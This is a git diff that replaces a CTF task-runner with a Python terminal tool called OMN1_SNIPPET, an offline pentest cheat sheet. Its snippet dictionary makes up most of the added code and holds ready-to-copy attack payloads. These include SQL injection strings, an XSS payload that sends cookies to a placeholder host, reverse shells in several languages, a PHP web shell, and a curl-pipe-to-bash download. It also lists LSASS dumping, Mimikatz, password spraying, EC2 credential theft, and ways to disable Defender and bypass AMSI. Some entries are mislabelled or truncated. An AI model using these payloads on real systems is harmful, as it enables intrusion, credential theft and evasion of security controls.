@@ -1,127 +1,231 @@
-# omn1_ctfpro.py – Main CLI for OMN1 CTFPRO by mgledev
+#!/usr/bin/env python3
+# ──────────────────────────────────────────────────────────────
+#  OMN1_SNIPPET  –  “Everything-in-One” Offline Pentest Cheat-CLI
+#  -------------------------------------------------------------
+#  Author  :  mgledev
+#  License :  MIT          (see repo root)
+#  Version : 1.2.0
+#
+#  A single self-contained terminal UI that gives you **ready-to-paste
+#  payloads, one-liners, enum checklists, escalation tricks, cloud &
+#  container cheat-codes …  all offline**.
+#
+#  Optional niceties:
+#    • colour  : pip install termcolor
+#    • clipboard: pip install pyperclip
+#
+#  Happy hacking – stay legal & ethical! 🐱‍💻
+# ──────────────────────────────────────────────────────────────
 
-import sys
-import os
-import json
-import inspect
-sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+from pathlib import Path
+from shutil import get_terminal_size
+import os, sys, textwrap, json, re
 
-from core.task_manager import add_task, show_task, set_flag, load_task, list_tasks
-from core.export import export_pdf
-from solvers.passcode_solver import solve_passcode
-from solvers.lesson_learned_solver import solve_lesson_learned
-from solvers.thegamev2_solver import solve_thegamev2
-from solvers.flagvault_solver import solve_flagvault
-from solvers.flagvault_v2_solver import solve_flagvault_v2
-from solvers.a_bucket_of_phish_solver import solve_a_bucket_of_phish
-from solvers.pyrat_solver import solve_pyrat
-from solvers.cheesy_solver import solve_cheesy_ctf
+# ── optional clipboard ──────────────────────────
+try:
+    import pyperclip
+    def copy_clip(txt): pyperclip.copy(txt); print("📋  Copied!")
+except ModuleNotFoundError:                         # pragma: no cover
+    def copy_clip(txt): pass
 
+# ── optional colours ────────────────────────────
+try:
+    from termcolor import cprint
+except ModuleNotFoundError:                         # pragma: no cover
+    def cprint(msg, colour=None, attrs=None): print(msg)
 
+# ────────────────────  ASCII SPLASH  ─────────────────────────
 
-# Available solvers
-SOLVERS = {
-    "PassCode": solve_passcode,
-    "Lesson_Learned": solve_lesson_learned,
-    "The_Game_v2": solve_thegamev2,
-    "FlagVault": solve_flagvault,
-    "FlagVault_V2": solve_flagvault_v2,
-    "A_Bucket_of_Phish": solve_a_bucket_of_phish,
-    "Pyrat": solve_pyrat,
-    "Cheesy": solve_cheesy_ctf
-}
-
-def menu():
-    while True:
-        os.system("clear")
-        print(r"""
+SPLASH = r"""
  ██████╗ ███╗   ███╗███╗   ██╗ ██╗
 ██╔═══██╗████╗ ████║████╗  ██║███║
 ██║   ██║██╔████╔██║██╔██╗ ██║╚██║
 ██║   ██║██║╚██╔╝██║██║╚██╗██║ ██║
 ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║ ██║
- ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═╝  CTFPRO  by mgledev
-""")
-        print("1. Add new task")
-        print("2. List tasks")
-        print("3. Show task details")
-        print("4. Select and run task")
-        print("5. Exit\n")
+ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═╝   OMN1_SNIPPET  by mgledev
+"""
 
-        choice = input("👉 Select an option (1-5): ").strip()
+# ─────────────────────  SNIPPET DATA  ────────────────────────
+#  Format:  { category: [ {d: description, p: payload}, … ] }
 
-        if choice == '1':
-            name = input("Task name: ")
-            difficulty = input("Difficulty (e.g., easy, medium, hard): ")
-            ip = input("Target IP (optional): ")
-            add_task(arg_obj(name=name, difficulty=difficulty, ip=ip))
-            input("\n✅ Task added. Press Enter to continue...")
-        elif choice == '2':
-            list_tasks(None)
-            input("\n📋 Press Enter to continue...")
-        elif choice == '3':
-            task = input("Enter task name: ")
-            show_task(arg_obj(task=task))
-            input("\n📌 Press Enter to continue...")
-        elif choice == '4':
-            choose_and_run_task()
-            input("\n🏁 Press Enter after completion...")
-        elif choice == '5':
-            print("👋 Exiting. Goodbye!")
+SNIPPETS: dict[str, list[dict]] = {
+
+# ── Web / App-Layer ──────────────────────────────────────────
+"🗄  SQL Injection": [
+    {"d":"Boolean auth-bypass (string)","p":"' OR 1=1-- -"},
+    {"d":"Time-based (MySQL)","p":"'||(SELECT SLEEP(5))-- -"},
+    {"d":"Stack queries (MSSQL xp_cmdshell)","p":"'; EXEC master..xp_cmdshell 'whoami'--"},
+    {"d":"Extract 1st user (LIMIT)","p":"' UNION SELECT user(),2 LIMIT 0,1-- -"},
+],
+"📑  XSS Quick List": [
+    {"d":"Classic alert","p":"<script>alert(1)</script>"},
+    {"d":"HTML attr","p":"\" onmouseover=alert(1) x=\""},
+    {"d":"SVG payload","p":"<svg/onload=confirm`1`>"},
+    {"d":"Fetch exfil","p":"<script>fetch('//LHOST/c?'+document.cookie)</script>"},
+    {"d":"Iframe CSP bypass (data)","p":"<iframe srcdoc=\"<script>alert`1`</script>\"></iframe>"},
+],
+"📂  LFI / RFI & PHP Filters": [
+    {"d":"Read /etc/passwd","p":"../../../../../../etc/passwd"},
+    {"d":"Base64 source","p":"php://filter/convert.base64-encode/resource=index.php"},
+    {"d":"PHP expect wrapper RCE","p":"php://filter/convert.base64-encode/resource=data:,<?php system($_GET[0]);?>"},
+    {"d":"Zip slip write","p":"../../../../../../../var/www/html/shell.php"},
+],
+"🖥  Web-Fuzz One-Liners": [
+    {"d":"Gobuster common","p":"gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50"},
+    {"d":"ffuf vhost","p":"ffuf -w sub.txt -H 'Host: FUZZ.TARGET' -u http://TARGET -fs 4242"},
+    {"d":"feroxbuster recurse & 404 filter","p":"feroxbuster -u http://TARGET -d 3 -x php,txt,html -C 404,403"},
+],
+
+# ── Reverse-Shell Arsenal ────────────────────────────────────
+"🎯  Reverse Shells": [
+    {"d":"Bash TCP","p":"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"},
+    {"d":"Ncat -e (busybox)","p":"nc -e /bin/sh <LHOST> <LPORT>"},
+    {"d":"Python3 full TTY","p":"python3 -c 'import os,pty,socket,sys;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"},
+    {"d":"PowerShell TCP","p":"powershell -nop -c \"$a='';$b=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$c=$b.GetStream();[byte[]]$d=0..65535|%{0};while(($e=$c.Read($d,0,$d.Length)) -ne 0){$a=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($d,0,$e);$f=(iex $a 2>&1 | Out-String );$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($f);$c.Write($g,0,$g.Length)}\""},
+    {"d":"Socat PTY","p":"socat TCP:<LHOST>:<LPORT> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"},
+],
+
+# ── Linux Post-Ex & PrivEsc ──────────────────────────────────
+"🛠  Linux Post-Ex": [
+    {"d":"Spawn TTY","p":"python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")'"},
+    {"d":"List SUID","p":"find / -perm -4000 -type f 2>/dev/null"},
+    {"d":"Writable cron scripts","p":"find /etc/cron* -type f -writable -ls"},
+    {"d":"Search passwords in history","p":"grep -iE 'pass|SECRET' ~/.bash_history"},
+    {"d":"Capabilities binaries","p":"getcap -r / 2>/dev/null"},
+    {"d":"Docker group escape","p":"docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
+],
+"⚙️  GTFOBins – Instant root": [
+    {"d":"Python SUID","p":"python -c 'import os,pty,subprocess; os.setuid(0); os.system(\"/bin/bash\")'"},
+    {"d":"Find writable /etc/passwd","p":"sed -i 's/^root:.*/root::$1$XyZ..../' /etc/passwd"},
+],
+"🍣  Container escapes": [
+    {"d":"Dirty pipe (CVE-2022-0847)","p":"wget ...dirtypipe.c; gcc dirtypipe.c -o p && ./p /etc/passwd /tmp/sh"},
+    {"d":"Privileged docker","p":"docker run -v /:/host --privileged -it alpine chroot /host bash"},
+],
+
+# ── Windows Post-Ex & Privesc ────────────────────────────────
+"🪟  Windows Post-Ex": [
+    {"d":"Seatbelt all","p":"Seatbelt.exe -group=all"},
+    {"d":"WinPEAS binary","p":"winPEASany.exe quiet local sysinfo userinfo systeminfo > report.txt"},
+    {"d":"Resolve plaintext creds","p":"findstr /si password *.txt *.xml *.config"},
+    {"d":"PowerView domain enum","p":"Import-Module .\\PowerView.ps1; Get-NetUser | select samaccountname"},
+    {"d":"LSASS dump (procdump)","p":"procdump64.exe -ma lsass.exe lsass.dmp"},
+],
+"🔑  Lateral / Credential Stuff": [
+    {"d":"Mimikatz sekurlsa::logonpasswords","p":"privilege::debug \nsekurlsa::logonpasswords"},
+    {"d":"SharpHound (bloodhound)","p":"SharpHound.exe -c All -domain comptest.local -zip"},
+    {"d":"Crackmapexec SMB spray","p":"cme smb 10.0.0.0/24 -u users.txt -p Summer2024"},
+],
+
+# ── Cloud & Other ────────────────────────────────────────────
+"☁️  AWS & Cloud": [
+    {"d":"AWS creds location","p":"~/.aws/credentials • ~/.aws/config"},
+    {"d":"List S3 buckets","p":"aws s3 ls"},
+    {"d":"Enumerate IAM perms","p":"aws iam list-attached-user-policies --user-name Bob"},
+    {"d":"Steal metadata (EC2)","p":"curl 169.254.169.254/latest/meta-data/iam/security-credentials/"},
+],
+"📦  Useful File Transfers": [
+    {"d":"Python HTTP server","p":"python3 -m http.server 80"},
+    {"d":"PHP web-shell","p":"<?php system($_GET['cmd']); ?>"},
+    {"d":"Certutil download","p":"certutil -urlcache -split -f http://<LHOST>/file.exe file.exe"},
+    {"d":"Nc upload","p":"nc -w 3 <LHOST> <LPORT> < file.bin"},
+],
+
+# ── AV / EDR Evasion Quick&Dirty ────────────────────────────
+"🩻  Evasion Tricks": [
+    {"d":"Disable Defender (needs admin)","p":"powershell -ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true"},
+    {"d":"Bypass AMSI (PowerShell)","p":"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"},
+    {"d":"Echo-encode payload","p":"echo ^<script>alert(1)^</script> > x.hta"},
+],
+
+# ── Misc / Helpers ───────────────────────────────────────────
+"📜  Misc & Helpers": [
+    {"d":"Base64 encode","p":"echo -n 'string' | base64"},
+    {"d":"Run binary from RAM (Linux)","p":"curl http://IP/shell | bash"},
+    {"d":"Kill noisy processes","p":"pkill -f log4jscan; pkill -f nikto"},
+    {"d":"Speed test wget","p":"wget --output-document=/dev/null http://speedtest.tele2.net/100MB.zip"},
+],
+
+}
+
+# ──────────────────────  CORE FUNCTIONS  ──────────────────────
+
+def banner(title=""):
+    width = get_terminal_size().columns
+    print()
+    cprint(title.center(width, "═"), "cyan", attrs=["bold"])
+
+def show_snippet(snip: dict):
+    cprint(f"\n📌  {snip['d']}", "yellow", attrs=["bold"])
+    print(textwrap.indent(snip['p'], "    "))
+    copy_clip(snip['p'])
+    print()
+
+def search(keyword: str):
+    keyword = keyword.lower()
+    out = []
+    for cat, lst in SNIPPETS.items():
+        for sn in lst:
+            if keyword in sn['d'].lower() or keyword in sn['p'].lower():
+                out.append((cat, sn))
+    return out
+
+# ─────────────────────────────  UI  ────────────────────────────
+
+def main():
+    os.system("clear")
+    print(SPLASH)
+    input("⏎  Press Enter to start …")
+
+    while True:
+        os.system("clear")
+        banner("CATEGORIES")
+        for idx, cat in enumerate(SNIPPETS, 1):
+            cprint(f"[{idx:02}] {cat}", "green")
+        cprint("[S ] Search    [Q ] Quit\n", "magenta")
+
+        choice = input("▶  ").strip().lower()
+        if choice in ("q", "quit", "exit"):
+            print("👋  Bye!")
             break
-        else:
-            input("❌ Invalid selection. Press Enter to try again...")
+        if choice in ("s", "search"):
+            key = input("\n🔍  Keyword: ").strip()
+            res = search(key)
+            if not res:
+                input("❌  Nothing found.  Enter …")
+                continue
+            for i, (cat, sn) in enumerate(res, 1):
+                cprint(f"\n[{i}] {cat} → {sn['d']}", "blue")
+                print(textwrap.indent(sn['p'], "    "))
+            input("\n✅  Enter to continue …")
+            continue
+        if not choice.isdigit():
+            continue
+        cat_idx = int(choice) - 1
+        if cat_idx not in range(len(SNIPPETS)):
+            continue
+        cat = list(SNIPPETS.keys())[cat_idx]
 
-def choose_and_run_task():
+        while True:
+            os.system("clear")
+            banner(cat)
+            for i, sn in enumerate(SNIPPETS[cat], 1):
+                print(f"[{i:02}] {sn['d']}")
+            cprint("[B ] Back\n", "magenta")
+            sub = input("▶  ").strip().lower()
+            if sub in ("b", "back"):
+                break
+            if not sub.isdigit():
+                continue
+            sn_idx = int(sub) - 1
+            if sn_idx in range(len(SNIPPETS[cat])):
+                show_snippet(SNIPPETS[cat][sn_idx])
+                input("⏎  Continue …")
+
+# ───────────────────────────────────────────────────────────────
+
+if __name__ == "__main__":
     try:
-        with open("data/ctf_tasks.json", "r") as f:
-            tasks = json.load(f)
-    except FileNotFoundError:
-        print("❌ Missing file: data/ctf_tasks.json.")
-        return
-
-    if not tasks:
-        print("⚠️ No tasks available.")
-        return
-
-    print("\n📘 Available Tasks:")
-    for i, task in enumerate(tasks, 1):
-        print(f"{i}. {task['name']} [{task['difficulty']}]")
-    print("\n↩️ Type `exit` to return to the main menu.")
-
-    user_input = input("\n👉 Enter task number: ").strip()
-    if user_input.lower() == 'exit':
-        print("↩️ Returning to main menu...")
-        return
-
-    try:
-        index = int(user_input) - 1
-        if 0 <= index < len(tasks):
-            task_name = tasks[index]['name']
-            normalized = task_name.replace(" ", "_").replace("?", "")
-            if normalized not in SOLVERS:
-                print(f"❌ No solver available for: {task_name}")
-                return
-
-            solver = SOLVERS[normalized]
-            sig = inspect.signature(solver)
-
-            if len(sig.parameters) == 2:
-                ip = input("🔗 Enter target IP (or type 'exit' to return): ").strip()
-                if ip.lower() == 'exit':
-                    print("↩️ Returning to main menu...")
-                    return
-                solver(task_name, ip)
-            else:
-                solver()
-        else:
-            print("❌ Invalid task number.")
-    except ValueError:
-        print("❌ Please enter a valid number.")
-
-class arg_obj:
-    def __init__(self, **entries):
-        self.__dict__.update(entries)
-
-if __name__ == '__main__':
-    menu()
+        main()
+    except KeyboardInterrupt:
+        print("\n👋  Interrupted – stay safe!")
